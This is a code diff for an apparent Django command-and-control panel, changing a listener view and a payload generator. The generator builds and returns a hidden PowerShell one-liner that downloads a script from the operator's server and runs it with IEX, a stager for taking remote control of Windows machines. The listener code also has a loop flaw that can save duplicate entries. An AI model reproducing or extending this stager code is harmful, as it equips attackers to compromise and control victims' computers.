@@ -71,13 +71,23 @@ def registerAgent(request):
     
 class Listener():
     class PostListener(View):
-        def post(self,request):
-            data = request.POST['listener']
-            listnerForm = ListenerForm()
-            listnerForm.interface = data
-            listnerForm.save()
-            return render(request, 'blog/payload-Gen.html' )
-
+        def post(self,request):    
+            eth = request.POST['listener']
+            listneres = ListenerForm.objects.all()
+            if not listneres:
+                listnerForm = ListenerForm()
+                listnerForm.interface = eth
+                listnerForm.save()
+                return JsonResponse({'data': True},status=200)
+            else:
+                for listener in listneres:
+                    if listener.interface == eth:
+                        return JsonResponse({'data': True},status=200)
+                    else:       
+                        listnerForm = ListenerForm()
+                        listnerForm.interface = eth
+                        listnerForm.save()
+                        return JsonResponse({'data': True},status=200)
 
         def get(self,request):
             listeners = ListenerForm.objects.order_by("-created_date").all()
@@ -85,12 +95,7 @@ class Listener():
 
     class payloadGen(View):
         def post(self,request):
-            #print(request.data)
-            #request.data['agent']
-            #eth1 = request.data['interface']
-            #return JsonResponse({"payload" : "payloads here"} , status=200)
-            eth = request.POST['listener']
-            
+            eth = request.POST['listener']      
             netifaces.ifaddresses(eth)
             ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
             output_path= "/tmp/{}".format(eth)
@@ -105,6 +110,10 @@ class Listener():
             with open(listen_path+"/{}".format(eth),"wt") as R:
                 R.write(payload)
 
+            listener = ListenerForm.objects.get(interface= eth)
+            if listener:
+                listener.ip = ip
+                listener.save()
             oneliner = "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/sc/{}\')\"".format(ip, str(port), eth)
             return JsonResponse({"payload" : oneliner} , status=200)
             #return render(request,'blog/payload-Gen.html', {'payloadline':oneliner})
